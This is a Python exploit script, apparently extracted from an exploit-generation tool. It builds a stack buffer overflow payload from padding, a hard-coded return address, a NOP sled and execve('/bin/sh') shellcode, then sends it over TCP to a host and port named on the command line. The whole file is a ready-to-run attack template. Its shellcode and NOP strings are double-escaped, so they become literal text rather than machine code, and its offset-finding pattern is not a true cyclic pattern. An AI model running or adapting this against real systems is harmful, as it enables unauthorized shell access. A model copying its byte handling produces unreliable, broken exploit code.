"""
Buffer Overflow Exploit Class
Extracted from HexStrike exploit generation system
"""

import struct
import socket
import sys


class BufferOverflowExploit:
    """Buffer overflow exploitation class"""

    def __init__(self, target_host, target_port, arch="x64"):
        """
        Initialize buffer overflow exploit

        Args:
            target_host: Target host IP or hostname
            target_port: Target port number
            arch: Target architecture (x86 or x64)
        """
        self.target_host = target_host
        self.target_port = int(target_port)
        self.arch = arch

    def create_pattern(self, length):
        """
        Create cyclic pattern for offset discovery

        Args:
            length: Length of pattern to create

        Returns:
            Cyclic pattern string
        """
        pattern = ""
        for i in range(length):
            pattern += chr(65 + (i % 26))  # A-Z pattern
        return pattern

    def generate_shellcode(self):
        """
        Generate shellcode for target architecture

        Returns:
            Shellcode bytes
        """
        if self.arch == "x86":
            # x86 execve("/bin/sh") shellcode
            shellcode = (
                "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e"
                "\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
            )
        else:
            # x64 execve("/bin/sh") shellcode
            shellcode = (
                "\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73"
                "\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05"
            )

        return shellcode.encode('latin-1')

    def create_exploit(self, offset=140, ret_addr=None):
        """
        Create buffer overflow exploit

        Args:
            offset: Offset to return address
            ret_addr: Return address to overwrite

        Returns:
            Exploit payload bytes
        """
        print(f"[+] Creating buffer overflow exploit...")
        print(f"[+] Offset: {offset} bytes")

        # Pattern to reach return address
        padding = "A" * offset

        if self.arch == "x86":
            # x86 return address (example)
            if ret_addr is None:
                ret_addr = 0x08048080  # Adjust for target
            ret_addr_bytes = struct.pack("<I", ret_addr)
        else:
            # x64 return address (example)
            if ret_addr is None:
                ret_addr = 0x0000000000401000  # Adjust for target
            ret_addr_bytes = struct.pack("<Q", ret_addr)

        # NOP sled
        nop_sled = "\\x90" * 16

        # Shellcode
        shellcode = self.generate_shellcode()

        exploit = padding.encode() + ret_addr_bytes + nop_sled.encode('latin-1') + shellcode

        print(f"[+] Exploit size: {len(exploit)} bytes")
        return exploit

    def send_exploit(self, payload):
        """
        Send exploit to target

        Args:
            payload: Exploit payload to send
        """
        try:
            print(f"[+] Connecting to {self.target_host}:{self.target_port}")

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_host, self.target_port))

            print("[+] Sending exploit...")
            sock.send(payload)

            # Try to interact
            try:
                response = sock.recv(1024)
                print(f"[+] Response: {response}")
            except:
                pass

            sock.close()
            print("[+] Exploit sent successfully")

        except Exception as e:
            print(f"[-] Error: {e}")


def main():
    """Main execution function for standalone usage"""
    if len(sys.argv) < 3:
        print(f"Usage: python3 {sys.argv[0]} <target_host> <target_port> [arch]")
        print(f"Example: python3 {sys.argv[0]} 192.168.1.100 9999 x64")
        sys.exit(1)

    target_host = sys.argv[1]
    target_port = sys.argv[2]
    arch = sys.argv[3] if len(sys.argv) > 3 else "x64"

    exploit = BufferOverflowExploit(target_host, target_port, arch)

    print(f"[+] Buffer Overflow Exploit")
    print(f"[+] Target: {target_host}:{target_port}")
    print(f"[+] Architecture: {arch}")

    # Create and send exploit
    payload = exploit.create_exploit()
    exploit.send_exploit(payload)


if __name__ == "__main__":
    main()
